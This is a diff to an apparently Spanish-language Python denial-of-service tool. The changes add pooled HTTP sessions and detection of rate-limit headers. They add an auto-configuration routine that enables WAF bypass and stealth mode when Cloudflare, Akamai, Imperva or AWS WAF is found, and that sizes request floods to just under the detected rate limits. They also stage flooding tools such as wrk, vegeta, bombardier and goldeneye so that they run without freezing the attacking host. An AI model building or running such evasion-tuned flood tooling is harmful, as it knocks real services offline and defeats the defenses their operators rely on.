@@ -154,8 +154,119 @@ USER_AGENTS = [
 ]
 
 # ============================================================================
-# FUNCIONES DE UTILIDAD Y FORMATO
+# CLASES Y UTILIDADES MEJORADAS
 # ============================================================================
+
+class ConnectionManager:
+    """Gestor mejorado de conexiones HTTP con pooling y reutilización"""
+    _sessions = {}
+    _session_locks = {}
+    
+    @classmethod
+    def get_session(cls, target_url: str, worker_id: int = 0):
+        """Obtiene o crea una sesión HTTP optimizada para el target"""
+        import requests
+        from requests.adapters import HTTPAdapter
+        from urllib3.util.retry import Retry
+        import threading
+        
+        # Usar un pool de sesiones por worker para mejor rendimiento
+        session_key = f"{target_url}_{worker_id % 10}"  # Pool de 10 sesiones
+        
+        if session_key not in cls._sessions:
+            if session_key not in cls._session_locks:
+                cls._session_locks[session_key] = threading.Lock()
+            
+            with cls._session_locks[session_key]:
+                if session_key not in cls._sessions:
+                    session = requests.Session()
+                    
+                    # Configurar adapter optimizado
+                    retry_strategy = Retry(
+                        total=1,
+                        backoff_factor=0,
+                        status_forcelist=[429, 500, 502, 503, 504]
+                    )
+                    
+                    if KEEP_ALIVE_POOLING:
+                        pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 5)
+                        pool_maxsize = min(MAX_CONNECTIONS, 20000)
+                    else:
+                        pool_connections = 1
+                        pool_maxsize = 1
+                    
+                    adapter = HTTPAdapter(
+                        max_retries=retry_strategy,
+                        pool_connections=pool_connections,
+                        pool_maxsize=pool_maxsize,
+                        pool_block=False
+                    )
+                    session.mount("http://", adapter)
+                    session.mount("https://", adapter)
+                    
+                    cls._sessions[session_key] = session
+        
+        return cls._sessions[session_key]
+    
+    @classmethod
+    def clear_sessions(cls):
+        """Limpia todas las sesiones almacenadas"""
+        for session in cls._sessions.values():
+            try:
+                session.close()
+            except:
+                pass
+        cls._sessions.clear()
+        cls._session_locks.clear()
+
+class PerformanceMonitor:
+    """Monitor mejorado de rendimiento del sistema"""
+    _last_check = {}
+    _cache_duration = 1.0  # Cachear métricas por 1 segundo
+    
+    @classmethod
+    def get_system_metrics(cls):
+        """Obtiene métricas del sistema con caching"""
+        import time
+        import psutil
+        
+        now = time.time()
+        cache_key = 'system_metrics'
+        
+        if cache_key in cls._last_check:
+            if now - cls._last_check[cache_key]['time'] < cls._cache_duration:
+                return cls._last_check[cache_key]['data']
+        
+        try:
+            memory = psutil.virtual_memory()
+            cpu = psutil.cpu_percent(interval=0.1)
+            disk = psutil.disk_usage('/')
+            
+            metrics = {
+                'memory_percent': memory.percent,
+                'memory_available_gb': round(memory.available / (1024**3), 2),
+                'memory_total_gb': round(memory.total / (1024**3), 2),
+                'cpu_percent': cpu,
+                'disk_percent': disk.percent,
+                'disk_free_gb': round(disk.free / (1024**3), 2)
+            }
+            
+            cls._last_check[cache_key] = {
+                'time': now,
+                'data': metrics
+            }
+            
+            return metrics
+        except Exception as e:
+            log_message("ERROR", f"Error obteniendo métricas del sistema: {e}")
+            return {
+                'memory_percent': 0,
+                'memory_available_gb': 0,
+                'memory_total_gb': 0,
+                'cpu_percent': 0,
+                'disk_percent': 0,
+                'disk_free_gb': 0
+            }
 
 class Colors:
     """Códigos de colores ANSI"""
@@ -601,7 +712,7 @@ def detect_service_by_port(port: int) -> str:
     return common_services.get(port, "Unknown")
 
 def analyze_security_headers(response_headers: Dict) -> Dict:
-    """Analiza security headers HTTP"""
+    """Analiza security headers HTTP incluyendo detección de rate limiting"""
     global SECURITY_HEADERS
     
     security_headers_check = {
@@ -612,12 +723,19 @@ def analyze_security_headers(response_headers: Dict) -> Dict:
         "x-xss-protection": False,
         "referrer-policy": False,
         "permissions-policy": False,
-        "x-permitted-cross-domain-policies": False
+        "x-permitted-cross-domain-policies": False,
+        # Headers de rate limiting
+        "x-ratelimit-limit": None,
+        "x-ratelimit-remaining": None,
+        "x-ratelimit-reset": None,
+        "retry-after": None,
+        "rate-limit": None,
+        "rate-limit-policy": None
     }
     
     headers_lower = {k.lower(): v for k, v in response_headers.items()}
     
-    # Verificar cada header
+    # Verificar cada header de seguridad
     if "strict-transport-security" in headers_lower:
         security_headers_check["strict-transport-security"] = True
         security_headers_check["hsts_max_age"] = extract_hsts_max_age(headers_lower["strict-transport-security"])
@@ -643,6 +761,17 @@ def analyze_security_headers(response_headers: Dict) -> Dict:
     
     if "x-permitted-cross-domain-policies" in headers_lower:
         security_headers_check["x-permitted-cross-domain-policies"] = True
+    
+    # Detectar headers de rate limiting
+    rate_limit_headers = [
+        "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
+        "retry-after", "rate-limit", "rate-limit-policy",
+        "x-rate-limit-limit", "x-rate-limit-remaining", "x-rate-limit-reset"
+    ]
+    
+    for header in rate_limit_headers:
+        if header in headers_lower:
+            security_headers_check[header] = headers_lower[header]
     
     SECURITY_HEADERS = security_headers_check
     return security_headers_check
@@ -1242,6 +1371,222 @@ def detect_waf_advanced() -> Optional[Dict]:
     except Exception as e:
         log_message("WARN", f"Error detectando WAF: {e}")
         return {"name": None, "detected": False}
+
+# ============================================================================
+# AUTO-CONFIGURACIÓN INTELIGENTE BASADA EN FINGERPRINT
+# ============================================================================
+
+def auto_configure_from_fingerprint(fingerprint: Dict, waf_info: Optional[Dict] = None):
+    """
+    Auto-configura el ataque basado en el fingerprint del target.
+    Activa automáticamente las mejores estrategias según lo detectado.
+    """
+    global WAF_BYPASS, STEALTH_MODE, USE_LARGE_PAYLOADS, ATTACK_MODE, RATE_ADAPTIVE
+    global MAX_CONNECTIONS, MAX_THREADS, PAYLOAD_SIZE_KB
+    
+    print_color("\n🤖 Auto-configurando estrategia de ataque...", Colors.CYAN, True)
+    changes = []
+    
+    # 1. Detección de WAF - Activar bypass automáticamente
+    if waf_info and waf_info.get("detected"):
+        waf_name = waf_info.get("name", "unknown")
+        if not WAF_BYPASS:
+            WAF_BYPASS = True
+            changes.append(f"✅ WAF Bypass activado (WAF detectado: {waf_name})")
+            log_message("INFO", f"Auto-activando WAF bypass - WAF detectado: {waf_name}")
+        
+        # Ajustes específicos por tipo de WAF
+        if waf_name == "cloudflare":
+            # Cloudflare es muy agresivo, usar stealth mode
+            if not STEALTH_MODE:
+                STEALTH_MODE = True
+                changes.append("✅ Stealth Mode activado (Cloudflare detectado)")
+            # Reducir conexiones para evitar bloqueos
+            MAX_CONNECTIONS = min(MAX_CONNECTIONS, 5000)
+            changes.append(f"✅ Conexiones reducidas a {MAX_CONNECTIONS} (Cloudflare)")
+        
+        elif waf_name in ["aws_waf", "imperva", "akamai"]:
+            # WAFs empresariales - usar payloads más pequeños y stealth
+            if not STEALTH_MODE:
+                STEALTH_MODE = True
+                changes.append(f"✅ Stealth Mode activado ({waf_name})")
+            PAYLOAD_SIZE_KB = min(PAYLOAD_SIZE_KB, 512)
+            changes.append(f"✅ Payload reducido a {PAYLOAD_SIZE_KB}KB ({waf_name})")
+    
+    # 2. Detección de CDN
+    cdn = fingerprint.get("cdn")
+    if cdn:
+        if cdn.lower() in ["cloudflare", "akamai", "fastly"]:
+            # CDNs agresivos - usar stealth y rate adaptive
+            if not STEALTH_MODE:
+                STEALTH_MODE = True
+                changes.append(f"✅ Stealth Mode activado (CDN: {cdn})")
+            if not RATE_ADAPTIVE:
+                RATE_ADAPTIVE = True
+                changes.append(f"✅ Rate Adaptive activado (CDN: {cdn})")
+            # Reducir carga inicial para evitar bloqueos
+            MAX_CONNECTIONS = min(MAX_CONNECTIONS, 3000)
+            changes.append(f"✅ Conexiones ajustadas a {MAX_CONNECTIONS} (CDN)")
+    
+    # 3. Detección de Rate Limiting (por headers de seguridad)
+    security_headers = fingerprint.get("security_headers", {})
+    rate_limit_headers = [
+        "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset",
+        "retry-after", "rate-limit", "rate-limit-policy",
+        "x-rate-limit-limit", "x-rate-limit-remaining", "x-rate-limit-reset"
+    ]
+    has_rate_limit = any(security_headers.get(h) is not None for h in rate_limit_headers)
+    
+    if has_rate_limit:
+        if not RATE_ADAPTIVE:
+            RATE_ADAPTIVE = True
+            changes.append("✅ Rate Adaptive activado (Rate Limiting detectado)")
+        
+        # Intentar extraer límite de rate limiting si está disponible
+        rate_limit_value = None
+        for header in ["x-ratelimit-limit", "x-rate-limit-limit", "rate-limit"]:
+            if security_headers.get(header):
+                try:
+                    # Intentar extraer número del header
+                    import re
+                    match = re.search(r'(\d+)', str(security_headers[header]))
+                    if match:
+                        rate_limit_value = int(match.group(1))
+                        break
+                except:
+                    pass
+        
+        # Ajustar conexiones según límite detectado
+        if rate_limit_value:
+            # Usar 80% del límite como máximo seguro
+            safe_limit = int(rate_limit_value * 0.8)
+            MAX_CONNECTIONS = min(MAX_CONNECTIONS, max(safe_limit, 500))
+            changes.append(f"✅ Conexiones ajustadas a {MAX_CONNECTIONS} (Límite detectado: {rate_limit_value})")
+        else:
+            # Reducir velocidad inicial si no se puede determinar el límite
+            MAX_CONNECTIONS = min(MAX_CONNECTIONS, 2000)
+            changes.append(f"✅ Conexiones reducidas a {MAX_CONNECTIONS} (Rate Limiting detectado)")
+    
+    # 4. Detección de Framework y ajuste de payloads
+    framework = fingerprint.get("framework")
+    if framework:
+        if framework.lower() in ["wordpress", "joomla", "drupal"]:
+            # CMS - usar payloads más pequeños y específicos
+            PAYLOAD_SIZE_KB = min(PAYLOAD_SIZE_KB, 256)
+            changes.append(f"✅ Payload ajustado a {PAYLOAD_SIZE_KB}KB (CMS: {framework})")
+        elif framework.lower() in ["nginx", "apache"]:
+            # Servidores web simples - puede soportar más carga
+            if not USE_LARGE_PAYLOADS:
+                USE_LARGE_PAYLOADS = True
+                changes.append(f"✅ Large Payloads activado (Servidor: {framework})")
+    
+    # 5. Detección de vulnerabilidades - ajustar modo de ataque
+    vulnerabilities = fingerprint.get("vulnerabilities", [])
+    if vulnerabilities:
+        # Si hay vulnerabilidades, usar modo MIXED para probar diferentes vectores
+        if ATTACK_MODE != "MIXED":
+            ATTACK_MODE = "MIXED"
+            changes.append("✅ Modo de ataque cambiado a MIXED (vulnerabilidades detectadas)")
+    
+    # 6. Detección de SSL/TLS - ajustar si es necesario
+    protocol = fingerprint.get("protocol", "https")
+    if protocol == "https":
+        # HTTPS - puede necesitar más recursos
+        if MAX_THREADS < 200:
+            MAX_THREADS = min(MAX_THREADS * 2, 400)
+            changes.append(f"✅ Threads ajustados a {MAX_THREADS} (HTTPS)")
+    
+    # Mostrar cambios aplicados
+    if changes:
+        print_color("📋 Cambios aplicados automáticamente:", Colors.GREEN)
+        for change in changes:
+            print_color(f"  {change}", Colors.CYAN)
+    else:
+        print_color("ℹ️ No se requirieron cambios automáticos", Colors.YELLOW)
+    
+    log_message("INFO", f"Auto-configuración completada - {len(changes)} cambios aplicados")
+
+def deploy_tool_gradually(tool_name: str, deploy_func, delay: float = 1.0, max_retries: int = 2):
+    """
+    Despliega una herramienta de forma gradual con verificación de recursos.
+    Evita freezes del sistema.
+    """
+    try:
+        # Verificar recursos antes de desplegar
+        metrics = PerformanceMonitor.get_system_metrics()
+        memory_percent = metrics.get('memory_percent', 0)
+        cpu_percent = metrics.get('cpu_percent', 0)
+        
+        # Si recursos están altos, esperar antes de desplegar
+        if memory_percent >= MEMORY_THRESHOLD_WARN:
+            wait_time = delay * 2  # Esperar más si memoria está alta
+            log_message("WARN", f"Memoria alta ({memory_percent:.1f}%) - esperando {wait_time}s antes de desplegar {tool_name}")
+            time.sleep(wait_time)
+            # Verificar de nuevo
+            metrics = PerformanceMonitor.get_system_metrics()
+            memory_percent = metrics.get('memory_percent', 0)
+            if memory_percent >= MEMORY_THRESHOLD_CRITICAL:
+                log_message("WARN", f"Memoria crítica - omitiendo despliegue de {tool_name}")
+                return False
+        
+        if cpu_percent > 85:
+            log_message("WARN", f"CPU alta ({cpu_percent:.1f}%) - esperando {delay}s antes de desplegar {tool_name}")
+            time.sleep(delay)
+        
+        # Desplegar herramienta
+        log_message("INFO", f"Desplegando {tool_name}...")
+        result = deploy_func()
+        
+        # Pequeña pausa después del despliegue para que el sistema se estabilice
+        time.sleep(delay)
+        
+        # Verificar que el despliegue fue exitoso
+        if result is not None:
+            log_message("INFO", f"{tool_name} desplegado correctamente")
+            return True
+        else:
+            log_message("WARN", f"{tool_name} no se pudo desplegar")
+            return False
+            
+    except Exception as e:
+        log_message("ERROR", f"Error desplegando {tool_name}: {e}")
+        return False
+
+def deploy_tools_with_throttling(tool_list: List[Tuple[str, callable]], max_tools: int, 
+                                  initial_delay: float = 0.5, delay_increment: float = 0.2):
+    """
+    Despliega herramientas con throttling gradual para evitar freezes.
+    Aumenta el delay entre despliegues progresivamente.
+    """
+    deployed_count = 0
+    current_delay = initial_delay
+    
+    for tool_name, deploy_func in tool_list:
+        if deployed_count >= max_tools:
+            log_message("INFO", f"Límite de herramientas alcanzado ({max_tools})")
+            break
+        
+        # Verificar recursos antes de cada despliegue
+        metrics = PerformanceMonitor.get_system_metrics()
+        memory_percent = metrics.get('memory_percent', 0)
+        
+        if memory_percent >= MEMORY_THRESHOLD_CRITICAL:
+            log_message("WARN", f"Memoria crítica ({memory_percent:.1f}%) - deteniendo despliegue de herramientas")
+            break
+        
+        # Desplegar con delay progresivo
+        success = deploy_tool_gradually(tool_name, deploy_func, delay=current_delay)
+        
+        if success:
+            deployed_count += 1
+            # Aumentar delay para el siguiente despliegue (evitar saturación)
+            current_delay += delay_increment
+        
+        # Pausa adicional si memoria está subiendo
+        if memory_percent >= MEMORY_THRESHOLD_WARN:
+            time.sleep(current_delay * 2)
+    
+    return deployed_count
 
 # ============================================================================
 # INSTALACIÓN DE HERRAMIENTAS
@@ -2308,38 +2653,8 @@ def deploy_custom_http_attack():
     def worker(worker_id: int):
         """Worker thread optimizado para máximo rendimiento"""
         try:
-            import requests
-            from requests.adapters import HTTPAdapter
-            from urllib3.util.retry import Retry
-            from urllib3.util.connection import create_connection
-            
-            session = requests.Session()
-            
-            # Configurar adapter con máximo rendimiento
-            retry_strategy = Retry(
-                total=1,  # Reducir retries para máximo throughput
-                backoff_factor=0,
-                status_forcelist=[429, 500, 502, 503, 504]
-            )
-            
-            # Pool optimizado para máximo rendimiento - más agresivo
-            # Para SSL-VPN y servicios que rechazan conexiones, necesitamos más conexiones simultáneas
-            if KEEP_ALIVE_POOLING:
-                pool_connections = min(CONNECTION_POOL_SIZE, MAX_CONNECTIONS // 5)  # Más conexiones por worker
-                pool_maxsize = min(MAX_CONNECTIONS, 20000)  # Aumentado
-            else:
-                # Sin pooling, crear nuevas conexiones cada vez (más efectivo para algunos servicios)
-                pool_connections = 1
-                pool_maxsize = 1
-            
-            adapter = HTTPAdapter(
-                max_retries=retry_strategy,
-                pool_connections=pool_connections,
-                pool_maxsize=pool_maxsize,
-                pool_block=False  # No bloquear, continuar inmediatamente
-            )
-            session.mount("http://", adapter)
-            session.mount("https://", adapter)
+            # Usar ConnectionManager para mejor gestión de conexiones (ya optimizado)
+            session = ConnectionManager.get_session(TARGET, worker_id)
             
             # Configurar timeout muy corto para máximo throughput y más requests
             # Timeouts más agresivos = más requests por segundo
@@ -4307,6 +4622,8 @@ def monitor_attack():
         log_message("INFO", "Monitoreo interrumpido por usuario")
     finally:
         monitoring_active = False
+        # Limpiar conexiones al finalizar
+        ConnectionManager.clear_sessions()
         log_message("INFO", f"Monitoreo finalizado - Peak RPS: {attack_stats.get('peak_rps', 0):.2f}")
 
 def display_stats(elapsed: float):
@@ -6160,6 +6477,9 @@ Ejemplos:
     if waf_info and waf_info.get("detected"):
         print_color(f"🛡️ WAF detectado: {waf_info.get('name', 'Unknown')}", Colors.YELLOW, True)
     
+    # Auto-configuración inteligente basada en fingerprint
+    auto_configure_from_fingerprint(fingerprint, waf_info)
+    
     # Configuración final
     print_color("\n" + "="*80, Colors.CYAN)
     print_color("⚙️  CONFIGURACIÓN FINAL", Colors.BOLD, True)
@@ -6244,7 +6564,7 @@ Ejemplos:
     log_message("INFO", f"Límite de herramientas: {MAX_TOOLS_DEPLOY} (memoria: {memory_percent:.1f}%)")
     
     if ATTACK_MODE == "MIXED":
-        # Desplegar múltiples herramientas CON LÍMITES DE SEGURIDAD
+        # Desplegar múltiples herramientas CON DESPLIEGUE GRADUAL Y THROTTLING
         # Priorizar herramientas más eficientes y menos pesadas
         priority_tools = [
             ("wrk", deploy_wrk_attack),
@@ -6260,30 +6580,29 @@ Ejemplos:
             ("goldeneye", deploy_goldeneye_attack),
         ]
         
-        # Desplegar herramientas prioritarias primero (más eficientes)
-        for tool_name, deploy_func in priority_tools:
-            if tools_deployed >= MAX_TOOLS_DEPLOY:
-                log_message("INFO", f"Límite de herramientas alcanzado ({MAX_TOOLS_DEPLOY}) - omitiendo {tool_name}")
-                break
-            if check_command_exists(tool_name):
-                try:
-                    deploy_func()
-                    tools_deployed += 1
-                    time.sleep(0.5)  # Pequeña pausa entre despliegues
-                except Exception as e:
-                    log_message("ERROR", f"Error desplegando {tool_name}: {e}")
+        # Filtrar solo herramientas disponibles
+        available_priority = [(name, func) for name, func in priority_tools if check_command_exists(name)]
+        available_secondary = [(name, func) for name, func in secondary_tools if check_command_exists(name)]
+        
+        # Desplegar herramientas prioritarias con throttling gradual
+        print_color("📦 Desplegando herramientas prioritarias...", Colors.CYAN)
+        tools_deployed += deploy_tools_with_throttling(
+            available_priority, 
+            max_tools=MAX_TOOLS_DEPLOY,
+            initial_delay=0.5,
+            delay_increment=0.2
+        )
         
         # Desplegar herramientas secundarias si hay espacio
-        for tool_name, deploy_func in secondary_tools:
-            if tools_deployed >= MAX_TOOLS_DEPLOY:
-                break
-            if check_command_exists(tool_name):
-                try:
-                    deploy_func()
-                    tools_deployed += 1
-                    time.sleep(0.5)
-                except Exception as e:
-                    log_message("ERROR", f"Error desplegando {tool_name}: {e}")
+        if tools_deployed < MAX_TOOLS_DEPLOY and available_secondary:
+            print_color("📦 Desplegando herramientas secundarias...", Colors.CYAN)
+            remaining_slots = MAX_TOOLS_DEPLOY - tools_deployed
+            tools_deployed += deploy_tools_with_throttling(
+                available_secondary[:remaining_slots],
+                max_tools=remaining_slots,
+                initial_delay=1.0,  # Delay mayor para herramientas más pesadas
+                delay_increment=0.3
+            )
         
         # Ataques Python personalizados (más controlados)
         if tools_deployed < MAX_TOOLS_DEPLOY:
@@ -6324,49 +6643,59 @@ Ejemplos:
                 log_message("ERROR", f"Error desplegando ataque socket-based: {e}")
     
     elif ATTACK_MODE == "CONSTANT":
-        # Ataque constante con herramientas específicas (limitado)
-        if tools_deployed < MAX_TOOLS_DEPLOY and check_command_exists("wrk"):
-            try:
-                deploy_wrk_attack()
-                tools_deployed += 1
-            except Exception as e:
-                log_message("ERROR", f"Error desplegando wrk: {e}")
+        # Ataque constante con herramientas específicas (limitado) - despliegue gradual
+        constant_tools = []
+        if check_command_exists("wrk"):
+            constant_tools.append(("wrk", deploy_wrk_attack))
+        
+        if constant_tools:
+            tools_deployed += deploy_tools_with_throttling(
+                constant_tools,
+                max_tools=min(MAX_TOOLS_DEPLOY, 2),
+                initial_delay=0.5,
+                delay_increment=0.2
+            )
         
         deploy_custom_http_attack()  # Siempre desplegar
         
         if SOCKET_ATTACK and memory_percent < MEMORY_THRESHOLD_WARN and tools_deployed < MAX_TOOLS_DEPLOY:
             try:
-                deploy_socket_based_attack()
+                deploy_tool_gradually("socket-based", deploy_socket_based_attack, delay=1.0)
                 tools_deployed += 1
             except Exception as e:
                 log_message("ERROR", f"Error desplegando ataque socket-based: {e}")
     
     elif ATTACK_MODE == "BURST":
-        # Ataques en ráfagas (limitado)
-        if tools_deployed < MAX_TOOLS_DEPLOY and check_command_exists("vegeta"):
-            try:
-                deploy_vegeta_attack()
-                tools_deployed += 1
-            except Exception as e:
-                log_message("ERROR", f"Error desplegando vegeta: {e}")
+        # Ataques en ráfagas (limitado) - despliegue gradual
+        burst_tools = []
+        if check_command_exists("vegeta"):
+            burst_tools.append(("vegeta", deploy_vegeta_attack))
+        if check_command_exists("bombardier"):
+            burst_tools.append(("bombardier", deploy_bombardier_attack))
         
-        if tools_deployed < MAX_TOOLS_DEPLOY and check_command_exists("bombardier"):
-            try:
-                deploy_bombardier_attack()
-                tools_deployed += 1
-            except Exception as e:
-                log_message("ERROR", f"Error desplegando bombardier: {e}")
+        if burst_tools:
+            tools_deployed += deploy_tools_with_throttling(
+                burst_tools,
+                max_tools=min(MAX_TOOLS_DEPLOY, 3),
+                initial_delay=0.5,
+                delay_increment=0.2
+            )
         
         deploy_custom_http_attack()  # Siempre desplegar
     
     elif ATTACK_MODE == "RAMP_UP":
-        # Aumento gradual (limitado)
-        if tools_deployed < MAX_TOOLS_DEPLOY and check_command_exists("hey"):
-            try:
-                deploy_hey_attack()
-                tools_deployed += 1
-            except Exception as e:
-                log_message("ERROR", f"Error desplegando hey: {e}")
+        # Aumento gradual (limitado) - despliegue gradual
+        ramp_tools = []
+        if check_command_exists("hey"):
+            ramp_tools.append(("hey", deploy_hey_attack))
+        
+        if ramp_tools:
+            tools_deployed += deploy_tools_with_throttling(
+                ramp_tools,
+                max_tools=min(MAX_TOOLS_DEPLOY, 2),
+                initial_delay=0.5,
+                delay_increment=0.2
+            )
         
         deploy_custom_http_attack()  # Siempre desplegar
     
